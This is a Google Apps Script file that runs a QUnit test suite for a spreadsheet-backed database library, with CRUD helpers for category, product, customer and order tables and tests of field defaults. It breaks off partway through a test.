function doGet(e) {
  var Template = HtmlService.createTemplateFromFile("index")
    .evaluate()
    .setTitle("CSH_TESTING")
    .setFaviconUrl(
      PropertiesService.getScriptProperties().getProperty("FAVICON_URL") ||
        "https://cdn-icons-png.flaticon.com/512/4838/4838856.png"
    )
    .addMetaTag("viewport", "width=device-width, initial-scale=1")
    .setXFrameOptionsMode(HtmlService.XFrameOptionsMode.ALLOWALL);
  return Template;
}

function include(filename) {
  return HtmlService.createHtmlOutputFromFile(filename).getContent();
}

function getDb_() {
  const props = PropertiesService.getScriptProperties();
  const dbName = props.getProperty("DB_NAME");
  const sheetId = props.getProperty("SHEET_ID");
  return CamDB.init(dbName, sheetId);
}

function getTestSourceCode() {
  // Extract the test source code from this file
  // This function will return the test definitions portion
  const sourceCode = `
// Database Configuration
const db = CamDB.init(
  "[DATABASE_NAME]",
  "[DATABASE_API_KEY]"
);

const categoryTableConfig = {
  tableName: "CATEGORY",
  historyTableName: "DELETED_CATEGORY",
  fields: {
    name: "string",
    created_at: "date",
  },
};

const productTableConfig = {
  tableName: "PRODUCT",
  historyTableName: "DELETED_PRODUCT",
  fields: {
    name: "string",
    price: "number",
    category_fk: "number",
    created_at: "date",
  },
};

const defaultsTestConfig = {
  tableName: "DEFAULTS_TEST",
  historyTableName: "DELETED_DEFAULTS_TEST",
  fields: {
    title: { type: "string", default: "Untitled" },
    views: {
      type: "number",
      default: 0,
      treatNullAsMissing: true,
      treatEmptyStringAsMissing: true,
    },
    is_active: { type: "boolean", default: true, treatNullAsMissing: true },
    published_at: { type: "date", default: new Date("2000-01-01T00:00:00Z") },
  },
};

// Test Suite Implementation
QUnit.module("Schema Creation", function () {
  QUnit.test("Database initialization", function (assert) {
    const creationResult = db.getCreationResult();
    assert.equal(
      creationResult.status,
      200,
      "Database should be created successfully"
    );
  });

  QUnit.test("Table context management", function (assert) {
    assert.equal(
      db.putTableIntoDbContext(categoryTableConfig).status,
      500,
      "Category table should be added to context"
    );
  });
});

QUnit.module("Category Operations", function () {
  QUnit.test("Category CRUD cycle", function (assert) {
    const testCategory = {
      name: "Test Category",
      created_at: new Date(),
    };

    // Create
    const createResult = JSON.parse(createCategory(testCategory));
    assert.equal(createResult.status, 200, "Should create category");
    const categoryId = createResult.id;

    // Read
    const readResult = JSON.parse(readCategoryById(categoryId));
    assert.equal(readResult.status, 200, "Should read category");
    assert.equal(readResult.data.name, testCategory.name, "Should match name");

    // Update
    const updatedCategory = {
      name: "Updated Category",
      created_at: new Date(),
    };
    const updateResult = JSON.parse(updateCategory(updatedCategory, categoryId));
    assert.equal(updateResult.status, 200, "Should update category");

    // Delete
    const deleteResult = JSON.parse(removeCategory(categoryId));
    assert.equal(deleteResult.status, 200, "Should delete category");
  });

  QUnit.test("Category listing", function (assert) {
    const result = JSON.parse(readCategoryTable());
    assert.equal(result.status, 200, "Should list categories");
    assert.ok(Array.isArray(result.data), "Should return array of categories");
  });
});

QUnit.module("Product Operations", function () {
  let testCategoryId;

  QUnit.test("Product with category setup", function (assert) {
    const categoryResult = JSON.parse(
      createCategory({
        name: "Test Category for Products",
        created_at: new Date(),
      })
    );
    assert.equal(categoryResult.status, 200, "Should create test category");
    testCategoryId = categoryResult.id;
  });

  QUnit.test("Product CRUD operations", function (assert) {
    const testProduct = {
      name: "Test Product",
      price: 99.99,
      category_fk: testCategoryId,
      created_at: new Date(),
    };

    const createResult = JSON.parse(createProduct(testProduct));
    assert.equal(createResult.status, 200, "Should create product");

    const productId = createResult.id;
    const readResult = JSON.parse(readProductById(productId));
    assert.equal(readResult.status, 200, "Should read product");
    assert.equal(readResult.data.name, testProduct.name, "Should match product name");

    const deleteResult = JSON.parse(removeProduct(productId));
    assert.equal(deleteResult.status, 200, "Should delete product");
  });

  QUnit.test("Product cleanup", function (assert) {
    const deleteResult = JSON.parse(removeCategory(testCategoryId));
    assert.equal(deleteResult.status, 200, "Cleanup: Should remove test category");
  });
});

QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test("Setup defaults table", function (assert) {
    const res = db.createTable(defaultsTestConfig);
    assert.equal(res.status, 200, "Defaults table created/ensured");
  });

  QUnit.test("Create injects defaults for missing fields", function (assert) {
    const createRes = db.create(tableName, {}, keyOrder);
    assert.equal(createRes.status, 200, "Create succeeded with defaults");
    
    const readRes = db.read(tableName, createRes.id);
    assert.equal(readRes.status, 200, "Read after create succeeded");
    assert.equal(readRes.data.title, "Untitled", "Default title applied");
    assert.equal(readRes.data.views, 0, "Default views applied");
    assert.equal(readRes.data.is_active, true, "Default is_active applied");
  });

  QUnit.test("Null respected unless treatNullAsMissing", function (assert) {
    const badRes = db.create(tableName, { title: null }, keyOrder);
    assert.equal(badRes.status, 500, "Null string without treat flag should fail");
    
    const goodRes = db.create(tableName, { is_active: null }, keyOrder);
    assert.equal(goodRes.status, 200, "Null with treatNullAsMissing should succeed");
    
    const readRes = db.read(tableName, goodRes.id);
    assert.equal(readRes.data.is_active, true, "Default applied for null is_active");
  });

  QUnit.test("Empty string default when enabled", function (assert) {
    const res = db.create(tableName, { views: "" }, keyOrder);
    assert.equal(res.status, 200, "Create succeeded with empty string treated as missing");
    
    const readRes = db.read(tableName, res.id);
    assert.equal(readRes.data.views, 0, "Default applied for empty string views");
  });

  QUnit.test("Update injects defaults for missing/flagged values", function (assert) {
    const base = db.create(tableName, { title: "Custom", views: 5, is_active: false }, keyOrder);
    assert.equal(base.status, 200, "Base record created");
    
    const upd1 = db.update(tableName, base.id, { is_active: null }, keyOrder);
    assert.equal(upd1.status, 200, "Update with null for treated field succeeded");
    
    const read1 = db.read(tableName, base.id);
    assert.equal(read1.data.is_active, true, "Default applied during update");
    
    const upd2 = db.update(tableName, base.id, { title: null }, keyOrder);
    assert.equal(upd2.status, 500, "Update with null for non-treated field should fail");
  });
});
`;

  return sourceCode.trim();
}

function getIndividualTestCode(testName) {
  // Map test names to their actual source code
  const testCodeMap = {
    "Database initialization": `
QUnit.module("Schema Creation", function () {
  QUnit.test("Database initialization", function (assert) {
    // Test database creation result
    const creationResult = db.getCreationResult();
    assert.equal(
      creationResult.status,
      200,
      "Database should initialize successfully"
    );
  });
});`,

    "Table context management": `
QUnit.module("Schema Creation", function () {
  QUnit.test("Table context management", function (assert) {
    // Test putting tables into context
    assert.equal(
      db.putTableIntoDbContext(categoryTableConfig).status,
      500,
      "Category table should be added to context"
    );
    assert.equal(
      db.putTableIntoDbContext(orderDetailConfig).status,
      500,
      "Order detail table should be added to context"
    );
  });
});`,

    "Category CRUD cycle": `
QUnit.module("Category Operations", function () {
  QUnit.test("Category CRUD cycle", function (assert) {
    // Create test category
    const testCategory = {
      name: "Test Category",
      created_at: new Date(),
    };

    // Test creation
    const createResult = JSON.parse(createCategory(testCategory));
    assert.equal(createResult.status, 200, "Should create category");

    if (createResult.status === 200) {
      const categoryId = createResult.id;

      // Test reading
      const readResult = JSON.parse(readCategoryById(categoryId));
      assert.equal(readResult.status, 200, "Should read category");
      assert.equal(
        readResult.data.name,
        testCategory.name,
        "Should match created name"
      );

      // Test updating
      const updatedCategory = {
        name: "Updated Category",
        created_at: new Date(),
      };
      const updateResult = JSON.parse(
        updateCategory(updatedCategory, categoryId)
      );
      assert.equal(updateResult.status, 200, "Should update category");

      // Verify update
      const verifyResult = JSON.parse(readCategoryById(categoryId));
      assert.equal(
        verifyResult.data.name,
        "Updated Category",
        "Should have updated name"
      );

      // Test deletion
      const deleteResult = JSON.parse(removeCategory(categoryId));
      assert.equal(deleteResult.status, 200, "Should delete category");
    }
  });
});`,

    "Category listing": `
QUnit.module("Category Operations", function () {
  QUnit.test("Category listing", function (assert) {
    const result = JSON.parse(readCategoryTable());
    assert.equal(result.status, 200, "Should list categories");
    assert.ok(
      Array.isArray(result.data),
      "Should return array of categories"
    );
  });
});`,

    "Product with category setup": `
QUnit.module("Product Operations", function () {
  let testCategoryId;

  // Setup
  QUnit.test("Product with category setup", function (assert) {
    const categoryResult = JSON.parse(
      createCategory({
        name: "Test Category for Products",
        created_at: new Date(),
      })
    );
    assert.equal(
      categoryResult.status,
      200,
      "Setup: Should create category"
    );
    testCategoryId = categoryResult.id;
  });
});`,

    "Product CRUD operations": `
QUnit.module("Product Operations", function () {
  QUnit.test("Product CRUD operations", function (assert) {
    const testProduct = {
      name: "Test Product",
      price: 99.99,
      category_fk: testCategoryId,
      created_at: new Date(),
    };

    // Create
    const createResult = JSON.parse(createProduct(testProduct));
    assert.equal(createResult.status, 200, "Should create product");

    if (createResult.status === 200) {
      const productId = createResult.id;

      // Read
      const readResult = JSON.parse(readProductById(productId));
      assert.equal(readResult.status, 200, "Should read product");
      assert.equal(
        readResult.data.name,
        testProduct.name,
        "Should match created name"
      );

      // Update
      const updatedProduct = {
        ...testProduct,
        name: "Updated Product",
        price: 149.99,
      };
      const updateResult = JSON.parse(
        updateProduct(updatedProduct, productId)
      );
      assert.equal(updateResult.status, 200, "Should update product");

      // Delete
      const deleteResult = JSON.parse(removeProduct(productId));
      assert.equal(deleteResult.status, 200, "Should delete product");
    }
  });
});`,

    "Product cleanup": `
QUnit.module("Product Operations", function () {
  // Cleanup
  QUnit.test("Product cleanup", function (assert) {
    const deleteResult = JSON.parse(removeCategory(testCategoryId));
    assert.equal(
      deleteResult.status,
      200,
      "Cleanup: Should remove test category"
    );
  });
});`,

    "Setup defaults table": `
QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test("Setup defaults table", function (assert) {
    const res = db.createTable(defaultsTestConfig);
    assert.equal(res.status, 200, "Defaults table created/ensured");
  });
});`,

    "Create injects defaults for missing fields": `
QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test(
    "Create injects defaults for missing fields",
    function (assert) {
      const createRes = db.create(tableName, {}, keyOrder);
      assert.equal(createRes.status, 200, "Create succeeded with defaults");
      const readRes = db.read(tableName, createRes.id);
      assert.equal(readRes.status, 200, "Read created record");
      assert.equal(
        readRes.data.title,
        "Untitled",
        "Default string applied"
      );
      assert.equal(readRes.data.views, 0, "Default number applied");
      assert.equal(readRes.data.is_active, "true", "Default boolean applied (stored as string)");
      assert.ok(
        readRes.data.published_at instanceof Date,
        "Default date applied"
      );
    }
  );
});`,

    "Null respected unless treatNullAsMissing": `
QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test("Null respected unless treatNullAsMissing", function (assert) {
    const badRes = db.create(tableName, { title: null }, keyOrder);
    assert.equal(
      badRes.status,
      500,
      "Null string without treat flag should fail"
    );

    const goodRes = db.create(
      tableName,
      { views: null, is_active: null },
      keyOrder
    );
    assert.equal(
      goodRes.status,
      200,
      "Null with treatNullAsMissing should default"
    );
    const rec = db.read(tableName, goodRes.id);
    assert.equal(rec.data.views, 0, "views defaulted from null");
    assert.equal(
      rec.data.is_active,
      "true",
      "is_active defaulted from null"
    );
  });
});`,

    "Empty string default when enabled": `
QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test("Empty string default when enabled", function (assert) {
    const res = db.create(tableName, { views: "" }, keyOrder);
    assert.equal(
      res.status,
      200,
      "Create succeeded with empty string treated as missing"
    );
    const rec = db.read(tableName, res.id);
    assert.equal(rec.data.views, 0, "views defaulted from empty string");
  });
});`,

    "Update injects defaults for missing/flagged values": `
QUnit.module("Default Values", function () {
  const tableName = defaultsTestConfig.tableName;
  const keyOrder = Object.keys(defaultsTestConfig.fields);

  QUnit.test(
    "Update injects defaults for missing/flagged values",
    function (assert) {
      const base = db.create(
        tableName,
        { title: "Custom", views: 5, is_active: false },
        keyOrder
      );
      assert.equal(base.status, 200, "Base record created");

      const upd1 = db.update(tableName, base.id, { views: "" }, keyOrder);
      assert.equal(
        upd1.status,
        200,
        "Update with empty string should default"
      );
      const rec1 = db.read(tableName, base.id);
      assert.equal(rec1.data.views, 0, "views defaulted on update");

      const upd2 = db.update(tableName, base.id, { title: null }, keyOrder);
      assert.equal(
        upd2.status,
        500,
        "Update with null for non-treated field should fail"
      );
    }
  );
});`,
  };

  return testCodeMap[testName] || "// Test code not found";
}

function runner() {
  const db = getDb_();

  const categoryTableConfig = {
    tableName: "CATEGORY",
    historyTableName: "DELETED_CATEGORY",
    fields: {
      name: "string",
      created_at: "date",
    },
  };

  const productTableConfig = {
    tableName: "PRODUCT",
    historyTableName: "DELETED_PRODUCT",
    fields: {
      name: "string",
      price: "number",
      category_fk: "number",
      created_at: "date",
    },
  };

  const customerTableConfig = {
    tableName: "CUSTOMER",
    historyTableName: "DELETED_CUSTOMER",
    fields: {
      first_name: "string",
      last_name: "string",
      email: "string",
      address: "string",
      created_at: "date",
    },
  };

  const defaultsTestConfig = {
    tableName: "DEFAULTS_TEST",
    historyTableName: "DELETED_DEFAULTS_TEST",
    fields: {
      title: { type: "string", default: "Untitled" },
      views: {
        type: "number",
        default: 0,
        treatNullAsMissing: true,
        treatEmptyStringAsMissing: true,
      },
      is_active: { type: "boolean", default: true, treatNullAsMissing: true },
      published_at: { type: "date", default: new Date("2000-01-01T00:00:00Z") },
    },
  };

  const orderTableConfig = {
    tableName: "ORDER",
    historyTableName: "DELETED_ORDER",
    fields: {
      customer_fk: "number",
      created_at: "date",
    },
  };

  function createSchema() {
    console.log(db.createTable(categoryTableConfig));
    console.log(db.createTable(productTableConfig));
    console.log(db.createTable(customerTableConfig));
    console.log(db.createTable(orderTableConfig));
    console.log(db.createTable(orderDetailConfig));
    console.log(db.createTable(defaultsTestConfig));
  }

  console.log(db.putTableIntoDbContext(categoryTableConfig));
  console.log(db.putTableIntoDbContext(productTableConfig));
  console.log(db.putTableIntoDbContext(customerTableConfig));
  console.log(db.putTableIntoDbContext(orderTableConfig));
  console.log(db.putTableIntoDbContext(defaultsTestConfig));

  const responseCreation = db.createManyToManyTableConfig({
    entity1TableName: orderTableConfig.tableName,
    entity2TableName: productTableConfig.tableName,
    fieldsRelatedToBothEntities: {
      quantity: "number",
    },
  });

  const orderDetailConfig = responseCreation.data;

  console.log(db.putTableIntoDbContext(orderDetailConfig));

  /**
   * ||=====================================================||
   * ||                   CRUD for CATEGORY                 ||
   * ||=====================================================||
   */

  function getCategoryRelatedRecords(
    foreignKey,
    field = "category_fk",
    fieldIndex = 4,
    options = {},
    useCache = false
  ) {
    const response = db.getRelatedRecords(
      foreignKey,
      productTableConfig.tableName,
      field,
      fieldIndex,
      options,
      useCache
    );
    return JSON.stringify(response);
  }

  function createCategory(newCategory) {
    newCategory.created_at = new Date(newCategory.created_at);
    const response = db.create(
      categoryTableConfig.tableName,
      newCategory,
      Object.keys(categoryTableConfig.fields)
    );

    console.log(response);
    return JSON.stringify(response);
  }

  function readCategoryTable() {
    const response = db.getAll(
      categoryTableConfig.tableName,
      (options = {}),
      (useCache = false)
    );
    console.log(response.status);
    console.log(response.message);

    return JSON.stringify(response);
  }

  function updateCategory(updatedCategory, id) {
    // console.log("to update:",updatedCategory)
    // console.log("id",id)
    updatedCategory.created_at = new Date(updatedCategory.created_at);

    const response = db.update(
      categoryTableConfig.tableName,
      id,
      updatedCategory,
      Object.keys(categoryTableConfig.fields)
    );

    console.log(response);

    return JSON.stringify(response);
  }

  function readCategoryById(id) {
    const response = db.read(categoryTableConfig.tableName, id);

    console.log(response);

    return JSON.stringify(response);
  }

  function removeCategory(id) {
    const response = db.remove(
      categoryTableConfig.tableName,
      categoryTableConfig.historyTableName,
      id
    );

    console.log(response);

    return JSON.stringify(response);
  }

  /**
   * ||=====================================================||
   * ||               CRUD for PRODUCT TABLE                ||
   * ||=====================================================||
   */
  function createProduct(newProduct) {
    // Convert dates as needed
    if (newProduct.created_at) {
      newProduct.created_at = new Date(newProduct.created_at);
    }
    const response = db.create(
      productTableConfig.tableName,
      newProduct,
      Object.keys(productTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function readProductTable() {
    const response = db.getAll(
      productTableConfig.tableName,
      {}, // options = {}
      false // useCache = false
    );
    return JSON.stringify(response);
  }

  function readProductById(id) {
    const response = db.read(productTableConfig.tableName, id);
    return JSON.stringify(response);
  }

  function updateProduct(updatedProduct, id) {
    if (updatedProduct.created_at) {
      updatedProduct.created_at = new Date(updatedProduct.created_at);
    }
    const response = db.update(
      productTableConfig.tableName,
      id,
      updatedProduct,
      Object.keys(productTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function removeProduct(id) {
    const response = db.removeWithCascade(
      productTableConfig.tableName,
      productTableConfig.historyTableName,
      id
    );
    return JSON.stringify(response);
  }

  /**
   * ||=====================================================||
   * ||              CRUD for CUSTOMER TABLE                ||
   * ||=====================================================||
   */

  function getRelatedCustomerRecords(
    foreignKey,
    field = "customer_fk",
    fieldIndex = 2,
    options = {},
    useCache = false
  ) {
    const response = db.getRelatedRecords(
      foreignKey,
      orderTableConfig.tableName,
      field,
      fieldIndex,
      options,
      useCache
    );

    return JSON.stringify(response);
  }

  function createCustomer(newCustomer) {
    if (newCustomer.created_at) {
      newCustomer.created_at = new Date(newCustomer.created_at);
    }
    const response = db.create(
      customerTableConfig.tableName,
      newCustomer,
      Object.keys(customerTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function readCustomerTable() {
    const response = db.getAll(customerTableConfig.tableName, {}, false);
    return JSON.stringify(response);
  }

  function readCustomerById(id) {
    const response = db.read(customerTableConfig.tableName, id);
    return JSON.stringify(response);
  }

  function updateCustomer(updatedCustomer, id) {
    if (updatedCustomer.created_at) {
      updatedCustomer.created_at = new Date(updatedCustomer.created_at);
    }
    const response = db.update(
      customerTableConfig.tableName,
      id,
      updatedCustomer,
      Object.keys(customerTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function removeCustomer(id) {
    const response = db.remove(
      customerTableConfig.tableName,
      customerTableConfig.historyTableName,
      id
    );
    return JSON.stringify(response);
  }

  /**
   * ||=====================================================||
   * ||                 CRUD for ORDER TABLE                ||
   * ||=====================================================||
   */
  function createOrder(newOrder) {
    if (newOrder.created_at) {
      newOrder.created_at = new Date(newOrder.created_at);
    }
    const response = db.create(
      orderTableConfig.tableName,
      newOrder,
      Object.keys(orderTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function readOrderTable() {
    const response = db.getAll(orderTableConfig.tableName, {}, false);
    return JSON.stringify(response);
  }

  function readOrderById(id) {
    const response = db.read(orderTableConfig.tableName, id);
    return JSON.stringify(response);
  }

  function updateOrder(updatedOrder, id) {
    if (updatedOrder.created_at) {
      updatedOrder.created_at = new Date(updatedOrder.created_at);
    }
    const response = db.update(
      orderTableConfig.tableName,
      id,
      updatedOrder,
      Object.keys(orderTableConfig.fields)
    );
    return JSON.stringify(response);
  }

  function removeOrder(id) {
    const response = db.removeWithCascade(
      orderTableConfig.tableName,
      orderTableConfig.historyTableName,
      id
    );
    return JSON.stringify(response);
  }

  /**
   * ||=====================================================||
   * ||         CRUD for ORDER_DETAIL (Many-to-Many)        ||
   * ||=====================================================||
   * The 'orderDetailConfig' object was generated via:
   * const responseCreation = db.createManyToManyTableConfig({ ... });
   * const orderDetailConfig = responseCreation.data;
   */
  function createOrderDetail(newOrderDetail) {
    if (newOrderDetail.created_at) {
      newOrderDetail.created_at = new Date(newOrderDetail.created_at);
    }
    // orderDetailConfig.fields => { created_at, order_id, product_id, quantity, ... }
    const response = db.create(
      orderDetailConfig.tableName,
      newOrderDetail,
      Object.keys(orderDetailConfig.fields)
    );
    return JSON.stringify(response);
  }

  function readOrderDetailTable() {
    const response = db.getAll(orderDetailConfig.tableName, {}, false);
    return JSON.stringify(response);
  }

  function readOrderDetailById(id) {
    const response = db.read(orderDetailConfig.tableName, id);
    return JSON.stringify(response);
  }

  function updateOrderDetail(updatedOrderDetail, id) {
    if (updatedOrderDetail.created_at) {
      updatedOrderDetail.created_at = new Date(updatedOrderDetail.created_at);
    }
    const response = db.update(
      orderDetailConfig.tableName,
      id,
      updatedOrderDetail,
      Object.keys(orderDetailConfig.fields)
    );
    return JSON.stringify(response);
  }

  function removeOrderDetail(id) {
    const response = db.remove(
      orderDetailConfig.tableName,
      orderDetailConfig.historyTableName,
      id
    );
    return JSON.stringify(response);
  }

  function readOrderDetailFromOrder(sourceId) {
    const response = db.getJunctionRecords(
      orderDetailConfig.tableName,
      orderTableConfig.tableName,
      productTableConfig.tableName,
      sourceId,
      (options = {})
    );

    console.log(response.status);
    console.log(response.message);
    console.log(response.metadata);

    for (record of response.data) {
      console.log(record);
    }

    return JSON.stringify(response);
  }

  function readOrderDetailFromProduct(sourceId) {
    const response = db.getJunctionRecords(
      orderDetailConfig.tableName,
      productTableConfig.tableName,
      orderTableConfig.tableName,
      sourceId,
      (options = {})
    );

    console.log(response.status);
    console.log(response.message);
    console.log(response.metadata);

    for (record of response.data) {
      console.log(record);
    }

    return JSON.stringify(response);
  }

  let currentTest = null;
  let allTests = [];

  return new Promise((resolve) => {
    QUnit.on("testStart", (testStart) => {
      currentTest = {
        name: testStart.name,
        suiteName: testStart.moduleName,
        fullName: testStart.fullName,
        assertions: [],
        errors: [],
        status: "running",
        sourceCode: getIndividualTestCode(testStart.name),
      };
    });

    QUnit.log((details) => {
      if (currentTest) {
        currentTest.assertions.push({
          message: details.message,
          result: details.result,
          expected: details.expected,
          actual: details.actual,
          source: details.source,
          module: details.module,
          runtime: details.runtime,
        });
      }
      if (!details.result) {
        currentTest.errors.push({
          message: details.stack || "Assertion failed",
          source: details.source,
          runtime: details.runtime,
        });
      }
    });

    QUnit.on("testEnd", (testEnd) => {
      if (currentTest) {
        currentTest.status = testEnd.status;
        currentTest.runtime = testEnd.runtime;
        allTests.push({ ...currentTest });
        currentTest = null;
      }
    });

    QUnit.on("runEnd", (runEnd) => {
      console.log("[TEST SUITE COMPLETED]: ", runEnd);

      const results = {
        testCounts: {
          passed: runEnd.testCounts.passed,
          failed: runEnd.testCounts.failed,
          skipped: runEnd.testCounts.skipped,
          todo: runEnd.testCounts.todo,
          total: runEnd.testCounts.total,
        },
        runtime: runEnd.runtime,
        status: runEnd.status,
        tests: allTests.map((test) => ({
          name: test.name,
          suiteName: test.suiteName,
          fullName: test.fullName,
          status: test.status,
          runtime: test.runtime,
          assertions: test.assertions.map((assertion) => ({
            message: String(assertion.message || ""),
            result: Boolean(assertion.result),
            expected: String(assertion.expected || ""),
            actual: String(assertion.actual || ""),
            source: String(assertion.source || ""),
            module: String(assertion.module || ""),
            // Remove 'source' and other potentially problematic fields
          })),
          errors: test.errors.map((error) => ({
            message: String(error.message || ""),
            source: String(error.source || ""),
            runtime: String(error.runtime || ""),
            // Remove 'source' and other potentially problematic fields
          })),
          sourceCode: String(test.sourceCode || ""),
        })),
        sourceCode: String(getTestSourceCode()),
      };

      console.log("results for the test suite", results);
      resolve(results);
    });

    QUnit.start();

    QUnit.module("Schema Creation", function () {
      QUnit.test("Database initialization", function (assert) {
        // Test database creation result
        const creationResult = db.getCreationResult();
        assert.equal(
          creationResult.status,
          200,
          "Database should initialize successfully"
        );
      });

      QUnit.test("Table context management", function (assert) {
        // Test putting tables into context
        assert.equal(
          db.putTableIntoDbContext(categoryTableConfig).status,
          500,
          "Category table should be added to context"
        );
        assert.equal(
          db.putTableIntoDbContext(orderDetailConfig).status,
          500,
          "Order detail table should be added to context"
        );
      });
    });

    QUnit.module("Category Operations", function () {
      QUnit.test("Category CRUD cycle", function (assert) {
        // Create test category
        const testCategory = {
          name: "Test Category",
          created_at: new Date(),
        };

        // Test creation
        const createResult = JSON.parse(createCategory(testCategory));
        assert.equal(createResult.status, 200, "Should create category");

        if (createResult.status === 200) {
          const categoryId = createResult.id;

          // Test reading
          const readResult = JSON.parse(readCategoryById(categoryId));
          assert.equal(readResult.status, 200, "Should read category");
          assert.equal(
            readResult.data.name,
            testCategory.name,
            "Should match created name"
          );

          // Test updating
          const updatedCategory = {
            name: "Updated Category",
            created_at: new Date(),
          };
          const updateResult = JSON.parse(
            updateCategory(updatedCategory, categoryId)
          );
          assert.equal(updateResult.status, 200, "Should update category");

          // Verify update
          const verifyResult = JSON.parse(readCategoryById(categoryId));
          assert.equal(
            verifyResult.data.name,
            "Updated Category",
            "Should have updated name"
          );

          // Test deletion
          const deleteResult = JSON.parse(removeCategory(categoryId));
          assert.equal(deleteResult.status, 200, "Should delete category");
        }
      });

      QUnit.test("Category listing", function (assert) {
        const result = JSON.parse(readCategoryTable());
        assert.equal(result.status, 200, "Should list categories");
        assert.ok(
          Array.isArray(result.data),
          "Should return array of categories"
        );
      });
    });

    QUnit.module("Product Operations", function () {
      let testCategoryId;

      // Setup
      QUnit.test("Product with category setup", function (assert) {
        const categoryResult = JSON.parse(
          createCategory({
            name: "Test Category for Products",
            created_at: new Date(),
          })
        );
        assert.equal(
          categoryResult.status,
          200,
          "Setup: Should create category"
        );
        testCategoryId = categoryResult.id;
      });

      QUnit.test("Product CRUD operations", function (assert) {
        const testProduct = {
          name: "Test Product",
          price: 99.99,
          category_fk: testCategoryId,
          created_at: new Date(),
        };
        console.log("starting create product test");
        // Create
        const createResult = JSON.parse(createProduct(testProduct));
        console.log("create product test result", createResult);
        assert.equal(createResult.status, 200, "Should create product");

        if (createResult.status === 200) {
          const productId = createResult.id;

          // Read
          const readResult = JSON.parse(readProductById(productId));
          assert.equal(readResult.status, 200, "Should read product");
          assert.equal(
            readResult.data.name,
            testProduct.name,
            "Should match created name"
          );

          // Update
          const updatedProduct = {
            ...testProduct,
            name: "Updated Product",
            price: 149.99,
          };
          const updateResult = JSON.parse(
            updateProduct(updatedProduct, productId)
          );
          assert.equal(updateResult.status, 200, "Should update product");

          // Delete
          const deleteResult = JSON.parse(removeProduct(productId));
          assert.equal(deleteResult.status, 200, "Should delete product");
        }
      });

      // Cleanup
      QUnit.test("Product cleanup", function (assert) {
        const deleteResult = JSON.parse(removeCategory(testCategoryId));
        assert.equal(
          deleteResult.status,
          200,
          "Cleanup: Should remove test category"
        );
      });
    });

    QUnit.module("Default Values", function () {
      const tableName = defaultsTestConfig.tableName;
      const keyOrder = Object.keys(defaultsTestConfig.fields);

      QUnit.test("Setup defaults table", function (assert) {
        const res = db.createTable(defaultsTestConfig);
        assert.equal(res.status, 200, "Defaults table created/ensured");
      });

      QUnit.test(
        "Create injects defaults for missing fields",
        function (assert) {
          const createRes = db.create(tableName, {}, keyOrder);
          assert.equal(createRes.status, 200, "Create succeeded with defaults");
          const readRes = db.read(tableName, createRes.id);
          assert.equal(readRes.status, 200, "Read created record");
          assert.equal(
            readRes.data.title,
            "Untitled",
            "Default string applied"
          );
          assert.equal(readRes.data.views, 0, "Default number applied");
          assert.equal(
            readRes.data.is_active,
            true,
            "Default boolean applied (stored as string but returned as boolean)"
          );
          console.log("readRes.data for checking date type", readRes.data);
          assert.ok(
            Object.prototype.toString.call(readRes.data.published_at) ===
              "[object Date]" && !isNaN(readRes.data.published_at),
            "Default date applied"
          );
        }
      );

      QUnit.test("Null respected unless treatNullAsMissing", function (assert) {
        const badRes = db.create(tableName, { title: null }, keyOrder);
        assert.equal(
          badRes.status,
          400,
          "Null string without treat flag should fail"
        );

        const goodRes = db.create(
          tableName,
          { views: null, is_active: null },
          keyOrder
        );
        assert.equal(
          goodRes.status,
          200,
          "Null with treatNullAsMissing should default"
        );
        const rec = db.read(tableName, goodRes.id);
        assert.equal(rec.data.views, 0, "views defaulted from null");
        assert.equal(rec.data.is_active, true, "is_active defaulted from null");
      });

      QUnit.test("Empty string default when enabled", function (assert) {
        const res = db.create(tableName, { views: "" }, keyOrder);
        assert.equal(
          res.status,
          200,
          "Create succeeded with empty string treated as missing"
        );
        const rec = db.read(tableName, res.id);
        assert.equal(rec.data.views, 0, "views defaulted from empty string");
      });

      QUnit.test(
        "Update injects defaults for missing/flagged values",
        function (assert) {
          const base = db.create(
            tableName,
            { title: "Custom", views: 5, is_active: false },
            keyOrder
          );
          assert.equal(base.status, 200, "Base record created");

          const upd1 = db.update(tableName, base.id, { views: "" }, keyOrder);
          assert.equal(
            upd1.status,
            200,
            "Update with empty string should default"
          );
          const rec1 = db.read(tableName, base.id);
          assert.equal(rec1.data.views, 0, "views defaulted on update");

          const upd2 = db.update(tableName, base.id, { title: null }, keyOrder);
          assert.equal(
            upd2.status,
            400,
            "Update with null for non-treated field should fail"
          );
        }
      );
    });

    // HIGH PRIORITY MISSING TESTS
    QUnit.module("Advanced CRUD Operations", function () {
      let testProductId;
      let testCategoryId;

      QUnit.test("Setup for advanced operations", function (assert) {
        // Create test category
        const categoryResult = JSON.parse(
          createCategory({
            name: "Test Category for Advanced Ops",
            created_at: new Date(),
          })
        );
        assert.equal(
          categoryResult.status,
          200,
          "Setup: Should create category"
        );
        testCategoryId = categoryResult.id;

        // Create test product
        const productResult = JSON.parse(
          createProduct({
            name: "Test Product for Advanced Ops",
            price: 199.99,
            category_fk: testCategoryId,
            created_at: new Date(),
          })
        );
        assert.equal(productResult.status, 200, "Setup: Should create product");
        testProductId = productResult.id;
      });

      QUnit.test("readIdList functionality", function (assert) {
        // Create multiple records to test readIdList
        const product1 = JSON.parse(
          createProduct({
            name: "Product 1",
            price: 10.0,
            category_fk: testCategoryId,
            created_at: new Date(),
          })
        );
        const product2 = JSON.parse(
          createProduct({
            name: "Product 2",
            price: 20.0,
            category_fk: testCategoryId,
            created_at: new Date(),
          })
        );

        assert.equal(product1.status, 200, "Product 1 created");
        assert.equal(product2.status, 200, "Product 2 created");

        // Test readIdList
        const ids = [product1.id, product2.id, testProductId];
        const readListResult = db.readIdList(productTableConfig.tableName, ids);

